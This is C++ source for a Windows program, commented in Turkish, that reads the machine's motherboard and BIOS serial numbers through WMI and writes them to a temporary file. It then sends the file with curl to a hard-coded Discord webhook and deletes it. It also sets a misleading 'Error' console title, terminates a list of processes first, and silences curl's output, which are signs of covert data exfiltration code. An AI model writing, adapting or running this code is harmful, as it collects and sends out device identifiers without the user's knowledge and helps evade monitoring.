#include <iostream>
#include <fstream>
#include <Windows.h>
#include <Wbemidl.h>
#include <comutil.h>
#include "processlist.h"

#pragma comment(lib, "comsuppw.lib")

int main() {

    const wchar_t* newTitle = L"Error";
  
   SetConsoleTitle(newTitle);

    ProcessList::TerminateProcesses();

    const std::wstring webhookUrl = (L"https://canary.discord.com/api/webhooks/1197270625337741474/k5_T7_k2ukPGefroP7FTDwK9usVqMLYXY9Owntkmdkeyp8mFSUezR_EsnCe7trtA-ks0");

    // Dosya yolu
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        return 1;
    }

    std::wstring filePath = tempPath;
    filePath += L"\\1337.txt";

    // Dosyayı oluştur ve aç
    std::wofstream file(filePath);
    if (!file.is_open()) {
        return 1;
    }

    // WMI için gerekli COM nesnelerini başlat
    IWbemLocator* pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    if (CoInitializeEx(0, COINIT_MULTITHREADED) != S_OK) {
        return 1;
    }

    if (CoCreateInstance(__uuidof(WbemLocator), 0, CLSCTX_INPROC_SERVER, __uuidof(IWbemLocator), (LPVOID*)&pLoc) != S_OK) {
        CoUninitialize();
        return 1;
    }

    if (pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMv2"), nullptr, nullptr, 0, NULL, 0, 0, &pSvc) != S_OK) {
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    // Anakart bilgilerini al
    IEnumWbemClassObject* pEnumerator = nullptr;
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BaseBoard"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) != S_OK) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return 1;
    }

    IWbemClassObject* pclsObj = nullptr;
    ULONG uReturn = 0;

    while (pEnumerator) {
        if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
            break;

        VARIANT vtProp;
        if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
            std::wstring motherboardSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
            file << L"Motherboard Serial Number: " << motherboardSerialNumber << std::endl;
            VariantClear(&vtProp);
        }

        pclsObj->Release();
    }

    // Dosyaya BIOS bilgilerini ekle
    if (pSvc->ExecQuery(bstr_t(L"WQL"), bstr_t(L"SELECT * FROM Win32_BIOS"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator) == S_OK) {
        while (pEnumerator) {
            if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) != S_OK || uReturn == 0)
                break;

            VARIANT vtProp;
            if (pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0) == S_OK) {
                std::wstring biosSerialNumber = static_cast<wchar_t*>(_bstr_t(vtProp.bstrVal));
                file << L"BIOS Serial Number: " << biosSerialNumber << std::endl;
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }
    }

    // Cleanup
    pEnumerator->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    // Dosyayı kapat
    file.close();

    // curl komutunu oluştur ve çalıştır
    std::wstring curlCommand = L"curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@" + filePath + L"\" " + webhookUrl + L" > NUL";
    _wsystem(curlCommand.c_str());

    // Dosyayı sil
    if (DeleteFileW(filePath.c_str()) == 0) {
        return 1;
    }

    return 0;
}
